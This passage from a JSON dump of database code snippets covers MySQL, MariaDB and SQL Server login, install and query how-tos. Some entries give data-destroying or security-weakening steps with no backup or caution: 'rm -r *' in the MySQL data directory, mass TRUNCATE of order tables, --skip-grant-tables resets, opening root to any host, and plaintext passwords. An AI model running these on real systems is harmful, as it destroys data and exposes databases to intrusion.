    "description": "You need to install a so-called Instance of MSSQL server on your computer. That is, installing all the needed files and services and database files. By default, there should be no MSSQL Server installed on your machine, assuming that you use a desktop Windows (7,8,10...).  You can start off with Microsoft SQL Server Express, which is a 10GB-limited, free version of MSSQL. It also lacks some other features (Server Agents, AFAIR), but it's good for some experiments.  Download it from the Microsoft Website and go through the installer process by choosing New SQL Server stand-alone installation .. after running the installer.  Click through the steps. For your scenario (it sounds like you mainly want to test some stuff), the default options should suffice.  Just give attention to the step Instance Configuration. There you will set the name of your MSSQL Server Instance. Call it something unique/descriptive like MY_TEST_INSTANCE or the like. Also, choose wisely the Instance root directory. In it, the database files will be placed, so it should be on a drive that has enough space.  Click further through the wizard, and when it's finished, your MSSQL instance will be up and running. It will also run at every boot if you have chosen the default settings for the services.  As soon as it's running in the background, you can connect to it with Management Studio by connecting to .\\MY_TEST_INSTANCE, given that that's the name you chose for the instance.\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1772,
    "keyword": null,
    "link": null,
    "title": " locate sql server",
    "description": "SELECT CHARINDEX('b','ab') //returns 2\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1773,
    "keyword": null,
    "link": null,
    "title": " login as a user mysql",
    "description": "mysql -u yourUsername -p\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1774,
    "keyword": null,
    "link": null,
    "title": " login failed for login due to trigger execution",
    "description": "SELECT * FROM sys.server_triggers; DISABLE TRIGGER triggername ON ALL SERVER;\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1775,
    "keyword": null,
    "link": null,
    "title": " login mysql",
    "description": "mysql --user=root --password=mypass\nmysql -u USERNAME -p\nmysql -u root -p databasename\nGRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' IDENTIFIED BY 'password';\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1776,
    "keyword": null,
    "link": null,
    "title": " login mysql ubuntu",
    "description": " mysql -u root -p \n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1777,
    "keyword": null,
    "link": null,
    "title": " login to database mysql terminal",
    "description": "SHOW DATABASES;\nmysql -u USERNAME -p\nuse DBNAME;\n",
    "reg_date": "2021-10-12T09:56:35.000Z"
  },
  {
    "id": 1778,
    "keyword": null,
    "link": null,
    "title": " login to mysql",
    "description": "mysql.exe &ndash;uroot &ndash;p\nmysql -u USERNAME -p\nuse DBNAME;\nmysql -u root -p databasename\nGRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost' IDENTIFIED BY 'password';\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1779,
    "keyword": null,
    "link": null,
    "title": " login to mysql database",
    "description": "mysql -u USERNAME -p\nmysql -u root -p databasename\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1780,
    "keyword": null,
    "link": null,
    "title": " lower case in sql",
    "description": "select UPPER('converted to upper'); select LOWER('CONVERTED TO LOWER');\nSELECT upper('Hello World') FROM dual;\t\t\t\t\t-- HELLO WORLD SELECT lower('Hello World') FROM dual;\t\t\t\t\t-- hello world SELECT inticap('hello world') FROM DUAL; \t\t\t\t-- Hello World\nSELECT UPPER(FIRST_NAME) , LOWER(LAST_NAME) FROM CUSTOMERS ;\nLOWER/UPPER LOWER wandelt eine String in eine in Kleinbuchstaben um.  UPPER ist das Gegenst&uuml;ck zu LOWER, und wandelt den String  in Grossbuchstaben um.  SELECT LOWER (expression)  SELECT UPPER (expression) \nLOWER(string);\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1781,
    "keyword": null,
    "link": null,
    "title": " lowest salary in sql",
    "description": "SELECT TOP 1 salary FROM ( SELECT DISTINCT TOP N salary FROM #Employee ORDER BY salary DESC ) AS temp ORDER BY salary\nSELECT first_name, last_name, salary, job_id FROM employees WHERE salary = (SELECT MIN(salary) FROM employees); \nSELECT MAX(SALARY) 'SECOND_MAX' FROM EMPLOYEES WHERE SALARY <> (SELECT MAX(SALARY) FROM EMPLOYEES);   OR  Here is the solution for nth highest salary from employees table   SELECT FIRST_NAME , SALARY FROM  (SELECT FIRST_NAME, SALARY, DENSE_RANK() OVER (ORDER BY SALARY DESC) AS SALARY_RANK FROM EMPLOYEES) WHERE SALARY_RANK = n; \nSELECT FIRST_NAME FROM EMPLOYEES WHERE SALARY = (SELECT MIN(SALARY) FROM EMPLOYEES);\nSELECT salary FROM Employee ORDER BY salary DESC LIMIT N-1, 1\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1782,
    "keyword": null,
    "link": null,
    "title": " ltrim sql",
    "description": "SELECT TRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple' SELECT LTRIM('   Exemple   ');\t\t\t\t\t\t-- 'Exemple   ' SELECT RTRIM('   Exemple   ');\t\t\t\t\t\t-- '   Exemple' SELECT TRIM(BOTH 'x' FROM 'xxxExemplexxx');\t\t\t-- 'Exemple' SELECT TRIM(LEADING 'x' FROM 'xxxExemplexxx');\t\t-- 'Exemplexxx' SELECT LTRIM('xxxExemplexxx', 'x');\t\t\t\t\t-- 'Exemplexxx' SELECT TRIM(TRAILING 'x' FROM 'xxxExemplexxx'); \t-- 'xxxExemple' SELECT RTRIM('xxxExemple', 'x');\t\t\t\t\t-- 'Exemplexxx'\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1783,
    "keyword": null,
    "link": null,
    "title": " mac install mysql",
    "description": "Using Homebrew: brew install mysql brew tap homebrew/services brew services start mysql mysqladmin -u root password 'secretpaSSw0rd'  Using Docker: docker pull mysql/mysql-server docker run --name=mysql -d mysql/mysql-server\nbrew install mysql  sudo chown -R _mysql:mysql /usr/local/var/mysql sudo mysql.server start  sudo mysql // set password for root user, or change root to another user ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password'; FLUSH PRIVILEGES;  exit mysql -u root -p \n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1784,
    "keyword": null,
    "link": null,
    "title": " mac os zsh: command not found: mysql",
    "description": "vi ~/.zshrc                                 // open the zsh config and edite export PATH=${PATH}:/usr/local/mysql/bin/   // to add these words source ~/.zshrc                            // make it work\n/usr/local/mysql/bin\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1785,
    "keyword": null,
    "link": null,
    "title": " mac restore mysql database command line",
    "description": "mysql -u [user] -p [database_name] < [filename].sql\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1786,
    "keyword": null,
    "link": null,
    "title": " mac uninstall mysql completely",
    "description": "## Open the Terminal  # Use mysqldump to backup your databases  # Check for MySQL processes with:  ps -ax | grep mysql  # Stop and kill any MySQL processes kill -9 [process_id]  # Analyze MySQL on HomeBrew: brew remove mysql brew cleanup  # Remove files: sudo rm /usr/local/mysql sudo rm -rf /usr/local/var/mysql sudo rm -rf /usr/local/mysql* sudo rm ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist sudo rm -rf /Library/StartupItems/MySQLCOM sudo rm -rf /Library/PreferencePanes/My*  # Unload previous MySQL Auto-Login: launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist  # Remove previous MySQL Configuration: subl /etc/hostconfig  # Remove the line MYSQLCOM=-YES- # Remove previous MySQL Preferences:  rm -rf ~/Library/PreferencePanes/My* sudo rm -rf /Library/Receipts/mysql* sudo rm -rf /Library/Receipts/MySQL* sudo rm -rf /private/var/db/receipts/*mysql*  ## Restart your computer just to ensure any MySQL processes are killed  Try to run mysql, it shouldn't work\n$ brew uninstall mysql  Uninstalling /usr/local/Cellar/mysql/5.6.19...\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1787,
    "keyword": null,
    "link": null,
    "title": " macos configure mysql access denied for user 'root'@'localhost'",
    "description": "You can do the following on Mac (El Capitan)  Open a Terminal window, use the command below to stop mysql if it's already running.  sudo /usr/local/mysql/support-files/mysql.server stop  You can also check System Preferences > MySQL to see if it is running  Start MySQL with this command:  sudo /usr/local/mysql/bin/mysqld_safe --skip-grant-tables  Open a new terminal window/tab:  sudo /usr/local/mysql/bin/mysql -u root  This should open \"mysql\" prompt. Execute the following command:  $mysql> UPDATE user SET authentication_string=PASSWORD(\"my_password\") WHERE User='root';  Troubleshooting tips:  A) The command for MySql versions before 5.7 was:  $mysql> UPDATE user SET Password=PASSWORD('my_password') where USER='root';  B) If you see ERROR 1046 (3D000): No database selected, then run this command first:  use mysql;  C) If you see unknown \"Password\" field error, then run this command:  UPDATE USER SET AUTHENTICATION_STRING=password('NewPassword') WHERE user='root';  $mysql> FLUSH PRIVILEGES;  $mysql> EXIT  Stop MySql server  sudo /usr/local/mysql/support-files/mysql.server stop  Restart MySQL, either through System Preferences > MySql or using a command.\n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1788,
    "keyword": null,
    "link": null,
    "title": " magento 2 order delete from db",
    "description": "SET FOREIGN_KEY_CHECKS=0; \nTRUNCATE TABLE `quote`; TRUNCATE TABLE `quote_address`; TRUNCATE TABLE `quote_address_item`; TRUNCATE TABLE `quote_id_mask`; TRUNCATE TABLE `quote_item`; TRUNCATE TABLE `quote_item_option`; TRUNCATE TABLE `quote_payment`; TRUNCATE TABLE `quote_shipping_rate`; \nTRUNCATE TABLE `sales_bestsellers_aggregated_daily`; TRUNCATE TABLE `sales_bestsellers_aggregated_monthly`; TRUNCATE TABLE `sales_bestsellers_aggregated_yearly`; \nTRUNCATE TABLE `sales_creditmemo`; TRUNCATE TABLE `sales_creditmemo_comment`; TRUNCATE TABLE `sales_creditmemo_grid`; TRUNCATE TABLE `sales_creditmemo_item`; TRUNCATE TABLE `sales_invoice`; TRUNCATE TABLE `sales_invoiced_aggregated`; TRUNCATE TABLE `sales_invoiced_aggregated_order`; TRUNCATE TABLE `sales_invoice_comment`; TRUNCATE TABLE `sales_invoice_grid`; TRUNCATE TABLE `sales_invoice_item`; TRUNCATE TABLE `sales_order`; TRUNCATE TABLE `sales_order_address`; TRUNCATE TABLE `sales_order_aggregated_created`; TRUNCATE TABLE `sales_order_aggregated_updated`; TRUNCATE TABLE `sales_order_grid`; TRUNCATE TABLE `sales_order_item`; TRUNCATE TABLE `sales_order_payment`; TRUNCATE TABLE `sales_order_status_history`; TRUNCATE TABLE `sales_order_tax`; TRUNCATE TABLE `sales_order_tax_item`; TRUNCATE TABLE `sales_payment_transaction`; TRUNCATE TABLE `sales_refunded_aggregated`; TRUNCATE TABLE `sales_refunded_aggregated_order`; TRUNCATE TABLE `sales_shipment`; TRUNCATE TABLE `sales_shipment_comment`; TRUNCATE TABLE `sales_shipment_grid`; TRUNCATE TABLE `sales_shipment_item`; TRUNCATE TABLE `sales_shipment_track`; TRUNCATE TABLE `sales_shipping_aggregated`; TRUNCATE TABLE `sales_shipping_aggregated_order`; \n",
    "reg_date": "2021-10-12T09:56:36.000Z"
  },
  {
    "id": 1789,
    "keyword": null,
    "link": null,
    "title": " make a field auto increment mysql",
    "description": "ALTER TABLE document MODIFY COLUMN document_id INT auto_increment \n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1790,
    "keyword": null,
    "link": null,
    "title": " make utf8mb4 format django",
    "description": "--For each database:  ALTER DATABASE     database_name     CHARACTER SET = utf8mb4     COLLATE = utf8mb4_unicode_ci;      --For each table:  ALTER TABLE     table_name     CONVERT TO CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;      --For each column:  ALTER TABLE     table_name     CHANGE column_name column_name     VARCHAR(191)     CHARACTER SET utf8mb4     COLLATE utf8mb4_unicode_ci;\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1791,
    "keyword": null,
    "link": null,
    "title": " mamp mysql path mac",
    "description": "/Applications/MAMP/Library/bin/mysql --host=localhost -uroot -proot\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1792,
    "keyword": null,
    "link": null,
    "title": " many to many flask-sqlalchemy",
    "description": "association_table = db.Table('association', db.Model.metadata,     db.Column('left_id', db.Integer, db.ForeignKey('left.id')),     db.Column('right_id', db.Integer, db.ForeignKey('right.id')) )  class Parent(db.Model):     __tablename__ = 'left'     id = db.Column(db.Integer, primary_key=True)     children = db.relationship(\"Child\",                     secondary=association_table)  class Child(db.Model):     __tablename__ = 'right'     id = db.Column(db.Integer, primary_key=True)   p = Parent() c = Child() p.children.append(c) db.session.add(p) db.session.commit()\nstudent_identifier = db.Table('student_identifier',     db.Column('class_id', db.Integer, db.ForeignKey('classes.class_id')),     db.Column('user_id', db.Integer, db.ForeignKey('students.user_id')) )  class Student(db.Model):     __tablename__ = 'students'     user_id = db.Column(db.Integer, primary_key=True)     user_fistName = db.Column(db.String(64))     user_lastName = db.Column(db.String(64))     user_email = db.Column(db.String(128), unique=True)   class Class(db.Model):     __tablename__ = 'classes'     class_id = db.Column(db.Integer, primary_key=True)     class_name = db.Column(db.String(128), unique=True)     students = db.relationship(\"Student\",                                secondary=student_identifier)  s = Student() c = Class() c.students.append(s) db.session.add(c) db.session.commit()\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1793,
    "keyword": null,
    "link": null,
    "title": " many to many sqlalchemy",
    "description": "class Parent(Base):     __tablename__ = 'parent'     id = Column(Integer, primary_key=True)     children = relationship(\"Child\", back_populates=\"parent\")  class Child(Base):     __tablename__ = 'child'     id = Column(Integer, primary_key=True)     parent_id = Column(Integer, ForeignKey('parent.id'))     parent = relationship(\"Parent\", back_populates=\"children\")\nassociation_table = Table('association', Base.metadata,     Column('left_id', Integer, ForeignKey('left.id')),     Column('right_id', Integer, ForeignKey('right.id')) )  class Parent(Base):     __tablename__ = 'left'     id = Column(Integer, primary_key=True)     children = relationship(         \"Child\",         secondary=association_table,         back_populates=\"parents\")  class Child(Base):     __tablename__ = 'right'     id = Column(Integer, primary_key=True)     parents = relationship(         \"Parent\",         secondary=association_table,         back_populates=\"children\")\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1794,
    "keyword": null,
    "link": null,
    "title": " mariadb.service: main process exited, code=exited, status=1/failure",
    "description": "-- if you haven't any real data in your database then clear all in  /var/lib/mysql.  -- After that try again to run command  mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql  -- to initialize database directory\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1795,
    "keyword": null,
    "link": null,
    "title": " mariadb.service failed with result 'exit-code'",
    "description": "cd /var/lib/mysql ls rm -r * mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql systemctl start mysqld systemctl start mysql.service systemctl start mariadb mysql \n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1796,
    "keyword": null,
    "link": null,
    "title": " mariadb ER NOT SUPPORTED AUTH MODE: Client does not support authentication protocol requested by server; consider upgrading MariaDB client",
    "description": "#SQLTools - VSCode err: ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MariaDB client  sudo mysql -u root MariaDB [(none)]> update mysql.user set password=password('<yourpassword>') where user='root'; MariaDB [(none)]> flush privileges;  -------------------------------------------------------------  sudo mysql -u root -p   Enter password: ******* select user,host,password,plugin from mysql.user;  output:   +------+-----------+------------------------+-------------+   | user | host      | password               | plugin      |   +------+-----------+------------------------+-------------+   | root | localhost | *****************      | unix_socket |   | root | e320      | *****************      | unix_socket |   | root | 127.0.0.1 | *****************      | unix_socket |   | root | ::1       | *****************      | unix_socket |   +------+-----------+------------------------+-------------+    -------------------------------------------------------------  sudo mysql -u root -p   Enter password: ******* update mysql.user set plugin='' where user='root'; flush privileges; \nCouldn't connect :(    Error: Error: ER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1797,
    "keyword": null,
    "link": null,
    "title": " mariadb JSON EXTRACT",
    "description": "+----+--------+-------+-------+---------------------------------+ | id | name   | price | stock | attr                            | +----+--------+-------+-------+---------------------------------+ |  2 | Shirt  | 10.50 |    78 | {\"size\": 42, \"colour\": \"white\"} | |  3 | Blouse | 17.00 |    15 | {\"colour\": \"white\"}             | +----+--------+-------+-------+---------------------------------+    SELECT name FROM clothes WHERE JSON_EXTRACT(attr, '$.size') = 42;\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1798,
    "keyword": null,
    "link": null,
    "title": " mariadb add foreign key",
    "description": "alter table group_a  add constraint fk_b_in_a foreign key(`b_id`)      references group_b(`b_id`)     on delete set null     on update set null;\nalter table caixa add foreign key (idcaixafluxo) references caixafluxo (idcaixafluxo);\n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1799,
    "keyword": null,
    "link": null,
    "title": " mariadb alter table add column if not exists example",
    "description": "ALTER TABLE tableName ADD COLUMN IF NOT EXISTS colName INT; \n",
    "reg_date": "2021-10-12T09:56:37.000Z"
  },
  {
    "id": 1800,
    "keyword": null,
    "link": null,
    "title": " mariadb alter user host",
    "description": "UPDATE mysql.user SET Host='%' WHERE Host='localhost' AND User='username'; FLUSH PRIVILEGES;\n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1801,
    "keyword": null,
    "link": null,
    "title": " mariadb case switch",
    "description": "mysql> SELECT CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END;  +-------------------------------------------------------------+ | CASE  WHEN 2>3 THEN 'this is true' ELSE 'this is false' END | +-------------------------------------------------------------+ | this is false                                               |  +-------------------------------------------------------------+\n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1802,
    "keyword": null,
    "link": null,
    "title": " mariadb cast date",
    "description": "CAST( column_name AS DATE )\n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1803,
    "keyword": null,
    "link": null,
    "title": " mariadb cast null to 0",
    "description": "SELECT COALESCE(col, 0) FROM `table`;\n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1804,
    "keyword": null,
    "link": null,
    "title": " mariadb cast to int",
    "description": "CAST(field AS integer) \n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1805,
    "keyword": null,
    "link": null,
    "title": " mariadb change column type",
    "description": "ALTER TABLE Schema.TableName   CHANGE COLUMN CurrentTableName NewTableName MEDIUMTEXT DEFAULT NULL COMMENT '(DC2Type:json_array)';\n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1806,
    "keyword": null,
    "link": null,
    "title": " mariadb check users",
    "description": "-- User only:  \tSELECT User FROM mysql.user; -- User + Host: \tSELECT host, user FROM mysql.user;\n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1807,
    "keyword": null,
    "link": null,
    "title": " mariadb convert date to timestamp",
    "description": "MariaDB [(none)]> SELECT UNIX_TIMESTAMP(); +------------------+ | UNIX_TIMESTAMP() | +------------------+ |       1269711082 | +------------------+  MariaDB [(none)]> SELECT UNIX_TIMESTAMP('2007-11-30 10:30:19'); +---------------------------------------+ | UNIX_TIMESTAMP('2007-11-30 10:30:19') | +---------------------------------------+ |                            1196436619 | +---------------------------------------+  MariaDB [(none)]> select unix_timestamp(\"2007-11-30 10:30:19.123456\"); +----------------------------------------------+  | unix_timestamp(\"2007-11-30 10:30:19.123456\") |  +----------------------------------------------+  | 1196411419.123456 |  +----------------------------------------------+  MariaDB [(none)]> SELECT FROM_UNIXTIME(UNIX_TIMESTAMP('2007-11-30 10:30:19')); +------------------------------------------------------+ | FROM_UNIXTIME(UNIX_TIMESTAMP('2007-11-30 10:30:19')) | +------------------------------------------------------+ | 2007-11-30 10:30:19                                  | +------------------------------------------------------+ \n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1808,
    "keyword": null,
    "link": null,
    "title": " mariadb date diff",
    "description": "SELECT DATEDIFF(expr1,expr2) as difference_in_days;   select DATEDIFF('2020-05-15', '2020-05-10'); //returns 5 select DATEDIFF('2020-05-13', '2020-05-16'); //returns -3 select DATEDIFF('2020-06-30', '2020-05-30'); //returns 30 \n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1809,
    "keyword": null,
    "link": null,
    "title": " mariadb date equals to current date plus days",
    "description": "SELECT CURRENT_DATE - INTERVAL 30 DAY\n",
    "reg_date": "2021-10-12T09:56:38.000Z"
  },
  {
    "id": 1810,
    "keyword": null,
    "link": null,
    "title": " mariadb disable foreign key checks",
    "description": "SET FOREIGN_KEY_CHECKS=0;\n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1811,
    "keyword": null,
    "link": null,
    "title": " mariadb error 1046 (3d000) no database selected",
    "description": "USE database_name;\n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1812,
    "keyword": null,
    "link": null,
    "title": " mariadb json select",
    "description": "+----+--------+-------+-------+---------------------------------+ | id | name   | price | stock | attr                            | +----+--------+-------+-------+---------------------------------+ |  2 | Shirt  | 10.50 |    78 | {\"size\": 42, \"colour\": \"white\"} | |  3 | Blouse | 17.00 |    15 | {\"colour\": \"white\"}             | +----+--------+-------+-------+---------------------------------+    SELECT name FROM clothes WHERE JSON_EXTRACT(attr, '$.size') = 42;\n+----+--------+-------+-------+---------------------------------+ | id | name   | price | stock | attr                            | +----+--------+-------+-------+---------------------------------+ |  2 | Shirt  | 10.50 |    78 | {\"size\": 42, \"colour\": \"white\"} | |  3 | Blouse | 17.00 |    15 | {\"colour\": \"white\"}             | +----+--------+-------+-------+---------------------------------+  UPDATE   Clothes SET   attr = JSON_REMOVE(attr, '$.size'); WHERE \tid = 2;      +----+--------+-------+-------+---------------------------------+ | id | name   | price | stock | attr                            | +----+--------+-------+-------+---------------------------------+ |  2 | Shirt  | 10.50 |    78 | {\"colour\": \"white\"} \t\t\t| |  3 | Blouse | 17.00 |    15 | {\"colour\": \"white\"} \t\t\t| +----+--------+-------+-------+---------------------------------+\n+----+--------+-------+-------+---------------------------------+ | id | name   | price | stock | attr                            | +----+--------+-------+-------+---------------------------------+ |  2 | Shirt  | 10.50 |    78 | {\"size\": 42, \"colour\": \"white\"} | |  3 | Blouse | 17.00 |    15 | {\"colour\": \"white\"}             | +----+--------+-------+-------+---------------------------------+  UPDATE   Clothes SET   attr = JSON_INSERT(attr, '$.size', 40); WHERE \tid = 3;      +----+--------+-------+-------+---------------------------------+ | id | name   | price | stock | attr                            | +----+--------+-------+-------+---------------------------------+ |  2 | Shirt  | 10.50 |    78 | {\"size\": 42, \"colour\": \"white\"} | |  3 | Blouse | 17.00 |    15 | {\"colour\": \"white\", \"size\": 40} | +----+--------+-------+-------+---------------------------------+\n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1813,
    "keyword": null,
    "link": null,
    "title": " mariadb mysql root access denied",
    "description": "UPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES; \n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1814,
    "keyword": null,
    "link": null,
    "title": " mariadb select multiple rows into one column",
    "description": "SELECT \tGROUP_CONCAT(DISTINCT id SEPARATOR ', ') AS 'ids' FROM \ttable_name WHERE \tcolumn_name = 'value' \n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1815,
    "keyword": null,
    "link": null,
    "title": " mariadb show all databases",
    "description": "SHOW DATABASES;\n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1816,
    "keyword": null,
    "link": null,
    "title": " mariadb show tables",
    "description": "SHOW TABLES FROM database\n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1817,
    "keyword": null,
    "link": null,
    "title": " mariadb vs mysql",
    "description": "/* Differences Table Parameter\t\t\t\t\t\t\t\tMariaDB\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tMySQL Storage Engines\t\t\t\t\t\t\tMariaDB has 12 new storage engines that you won't find in MySQL.\t\t\t\t\t\t\t\t\t\t\t\t\tFewer options for storage Speed Improvements\t\t\t\t\t\tMariaDB shows an improved speed when compared to MySQL.\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tSlower speed Initial release\t\t\t\t\t\t\t2009\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t1995 Server operating systems\t\t\t\tFreeBSD, Linux, Solaris, Windows\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tFreeBSD, Linux, OS X, Solaris, Windows Faster cache/indexes\t\t\t\t\tAn INSERT statement can be completed 24% faster\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tSlower Larger and Faster Connection Pool\t\tAdvanced thread pool capable of running faster and supporting up to 200,000+ connections.\t\t\t\t\t\t\tCannot support up to 200,000 connections per time. Improved Replication\t\t\t\t\tSafer and faster. Updates 2x faster\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tCommunity edition allows a static number of threads to be connected. MySQL's enterprise plan comes with thread capabilities. New Features/Extensions\t\t\t\t\tComes with new features and extensions including the JSON, WITH and KILL statements.\t\t\t\t\t\t\t\tThe new MariaDB features are not provided in MySQL. Missing Features\t\t\t\t\t\tLacks some of the features provided by the MySQL enterprise edition. Offers alternative open-source plugins.\t\tThe Enterprise Edition of MySQL uses a proprietary code. Only users of MySQL Enterprise Edition have access to this. Priority code\t\t\t\t\t\t\tDoesn't allow access to this propriety content and is a closed source.\t\t\t\t\t\t\t\t\t\t\t\tUses some proprietary code in its Enterprise Edition. Data Masking\t\t\t\t\t\t\tNo\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tYes Dynamic columns\t\t\t\t\t\t\tNo\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tYes Monitoring\t\t\t\t\t\t\t\tSQLyog\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tMySQL workbench Routing\t\t\t\t\t\t\t\t\tMariaDB MaxScale\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tMysql Router Analytics\t\t\t\t\t\t\t\tMariaDB ColumnStore\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tNo Secondary database model\t\t\t\tDocument store and Graph DBMS\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tDocument store Git hub stars\t\t\t\t\t\t\t2.8 k\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t4k Forks\t\t\t\t\t\t\t\t\t868\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t1.6 K Famous companies using\t\t\t\t\tNrise, Accenture, Docplanner, Grooveshark.\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAirbnb, Uber Technogloeis, Netflix, Dropbox. */\n",
    "reg_date": "2021-10-12T09:56:39.000Z"
  },
  {
    "id": 1818,
    "keyword": null,
    "link": null,
    "title": " max length found in mysql",
    "description": "SELECT city, max(length(city)) FROM Customers;\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1819,
    "keyword": null,
    "link": null,
    "title": " mean mysql",
    "description": "avg(column)\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1820,
    "keyword": null,
    "link": null,
    "title": " media sql",
    "description": "SELECT AVG(Et&agrave;) FROM Studenti\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1821,
    "keyword": null,
    "link": null,
    "title": " median mysql",
    "description": "SELECT x.val from data x, data y GROUP BY x.val HAVING SUM(SIGN(1-SIGN(y.val-x.val))) = (COUNT(*)+1)/2\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1822,
    "keyword": null,
    "link": null,
    "title": " mengatasi error mysqldump: [ERROR] unknown option '--no-beep'",
    "description": "mysqldump --no-defaults -u root -p my_database > backups.sql \n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1823,
    "keyword": null,
    "link": null,
    "title": " merge clause with inner join",
    "description": "MERGE table1 USING (SELECT table3.keycolumn,               table2.DataColumn1,               table2.DataColumn2        FROM table2        INNER JOIN table3            ON table2.anotherKey = table3.anotherKey        WHERE table2.anotherKey = 'A1') tmpTable ON     table1.keyColumn = tmpTable.keyColumn WHEN MATCHED THEN        UPDATE        SET table1.DataColumn1 = tmpTable.DataColumn1             ,table1.DataColumn2 = tmpTable.DataColumn2;\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1824,
    "keyword": null,
    "link": null,
    "title": " metasploit start postgresql",
    "description": "sudo service postgresql start sudo msfdb init\n",
    "reg_date": "2021-10-12T09:56:40.000Z"
  },
  {
    "id": 1825,
    "keyword": null,
    "link": null,
    "title": " microsoft sql server",
